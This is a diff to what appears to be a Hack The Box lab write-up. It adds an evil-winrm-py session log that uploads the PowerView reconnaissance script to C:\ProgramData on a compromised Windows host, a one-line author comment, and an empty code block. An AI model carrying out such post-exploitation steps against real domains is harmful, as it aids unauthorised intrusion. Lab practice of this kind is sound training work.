@@ -554,3 +554,15 @@ Bloodhound categorizes this user as a tier zero operator
 
 ![](Pasted%20image%2020261006203346.png)
 
+```python
+evil-winrm-py PS C:\ProgramData> upload PowerView.ps1 .
+Uploading /home/kali/htb/logging/PowerView.ps1: 768kB [00:01, 532kB/s]                                       
+[+] File uploaded successfully as: C:\ProgramData\PowerView.ps1
+evil-winrm-py PS C:\ProgramData>
+```
+
+Using my evil-winrm session ill upload powerview
+
+```python
+
+```
